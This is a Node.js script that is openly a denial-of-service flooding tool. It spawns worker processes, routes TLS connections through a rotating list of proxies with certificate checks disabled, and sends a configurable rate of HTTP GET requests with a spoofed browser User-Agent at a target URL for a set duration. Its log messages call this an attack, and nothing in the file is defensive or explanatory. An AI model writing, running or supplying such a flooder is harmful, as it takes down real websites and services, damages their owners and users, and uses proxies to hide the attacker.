const cluster = require('cluster');
const fs = require('fs');
const tls = require('tls');
const { URL } = require('url');

if (process.argv.length < 7) {
    console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const rps = parseInt(process.argv[4], 10);
const threads = parseInt(process.argv[5], 10);
const proxyFile = process.argv[6];

let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());

if (proxies.length === 0) {
    console.error("Error: Proxy file is empty or cannot be read.");
    process.exit(1);
}

if (cluster.isMaster) {
    console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${threads} threads`);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log("Attack completed.");
        process.exit(0);
    }, duration * 1000);

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} exited`);
    });
} else {
    const target = new URL(targetURL);
    let proxyIndex = 0;
    const startTime = Date.now();

    function sendTLSRequest(proxy) {
        const proxyParts = proxy.trim().split(":");
        if (proxyParts.length < 2) return;

        const proxyHost = proxyParts[0];
        const proxyPort = parseInt(proxyParts[1], 10);

        const options = {
            host: proxyHost,
            port: proxyPort,
            servername: target.hostname,
            rejectUnauthorized: false
        };

        const client = tls.connect(options, () => {
            function flood() {
                if (Date.now() - startTime >= duration * 1000) {
                    console.log(`Worker ${process.pid} stopping attack.`);
                    process.exit(0);
                }

                for (let i = 0; i < rps; i++) {
                    const request = `GET ${target.pathname} HTTP/1.1\r\n` +
                                    `Host: ${target.hostname}\r\n` +
                                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
                                    "Accept: */*\r\n" +
                                    "Connection: keep-alive\r\n\r\n";
                    client.write(request);
                }

                setTimeout(flood, 10); // Delay kecil untuk mengurangi beban CPU
            }
            flood();
        });

        client.on("error", () => {
            client.destroy();
        });

        client.on("close", () => {
            client.destroy();
        });
    }

    function attackLoop() {
        if (Date.now() - startTime >= duration * 1000) {
            console.log(`Worker ${process.pid} stopping attack.`);
            process.exit(0);
        }

        const proxy = proxies[proxyIndex];
        proxyIndex = (proxyIndex + 1) % proxies.length; 

        sendTLSRequest(proxy);
        setTimeout(attackLoop, 10); // Delay kecil agar CPU tidak overload
    }

    process.on('uncaughtException', (err) => {
        console.error('Uncaught exception:', err);
        process.exit(1);
    });

    attackLoop();
}
